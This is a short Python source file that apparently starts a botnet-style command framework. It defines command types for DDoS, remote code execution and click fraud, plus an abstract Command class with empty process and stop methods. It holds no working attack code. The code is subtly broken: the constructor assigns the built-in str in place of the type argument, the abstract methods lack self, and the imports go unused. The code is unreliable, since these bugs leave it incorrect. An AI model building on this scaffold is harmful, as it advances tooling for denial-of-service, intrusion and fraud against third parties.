from abc import ABC, abstractmethod
import uuid
from enum import Enum


class CommandType:
    DDoS = 'ddos'
    RCE = 'rce'
    CLICK = 'click'


class Command(ABC):
    """
    Command definition
    """

    def __init__(self, type: str, atomic: bool = True) -> None:
        self.type = str
        self.is_atomic = atomic  # Indicates if a command is a one shot or a long process

    @abstractmethod
    def process() -> None:
        pass

    @abstractmethod
    def stop() -> None:
        pass
